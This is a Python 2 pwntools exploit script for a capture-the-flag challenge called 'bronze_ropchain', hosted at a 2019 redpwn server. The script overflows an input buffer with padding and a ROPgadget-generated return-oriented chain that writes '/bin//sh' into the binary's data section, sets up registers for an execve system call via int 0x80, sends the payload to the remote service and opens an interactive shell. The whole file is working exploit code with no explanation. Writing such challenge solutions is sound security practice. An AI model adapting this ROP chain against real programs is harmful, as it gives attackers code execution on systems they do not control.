#!/usr/bin/env python2
# execve generated by ROPgadget
from pwn import *

e = ELF("./bronze_ropchain")
#r = process("./bronze_ropchain")
r = remote("chall.2019.redpwn.net",4004)	

p = 'a'*28

p += p32(0x0806ef2b) # pop edx ; ret
p += p32(0x080da060) # @ .data
p += p32(0x080564b4) # pop eax ; pop edx ; pop ebx ; ret
p += '/bin'
p += p32(0x080da060) # padding without overwrite edx
p += p32(0x41414141) # padding
p += p32(0x08056fe5) # mov dword ptr [edx], eax ; ret
p += p32(0x0806ef2b) # pop edx ; ret
p += p32(0x080da064) # @ .data + 4
p += p32(0x080564b4) # pop eax ; pop edx ; pop ebx ; ret
p += '//sh'
p += p32(0x080da064) # padding without overwrite edx
p += p32(0x41414141) # padding
p += p32(0x08056fe5) # mov dword ptr [edx], eax ; ret
p += p32(0x0806ef2b) # pop edx ; ret
p += p32(0x080da068) # @ .data + 8
p += p32(0x080565a0) # xor eax, eax ; ret
p += p32(0x08056fe5) # mov dword ptr [edx], eax ; ret
p += p32(0x080481c9) # pop ebx ; ret
p += p32(0x080da060) # @ .data
p += p32(0x0806ef52) # pop ecx ; pop ebx ; ret
p += p32(0x080da068) # @ .data + 8
p += p32(0x080da060) # padding without overwrite ebx
p += p32(0x0806ef2b) # pop edx ; ret
p += p32(0x080da068) # @ .data + 8
p += p32(0x080565a0) # xor eax, eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x0807c3ba) # inc eax ; ret
p += p32(0x080495b3) # int 0x80


r.sendlineafter("name?", p)
r.sendlineafter("day?", "")
r.interactive()
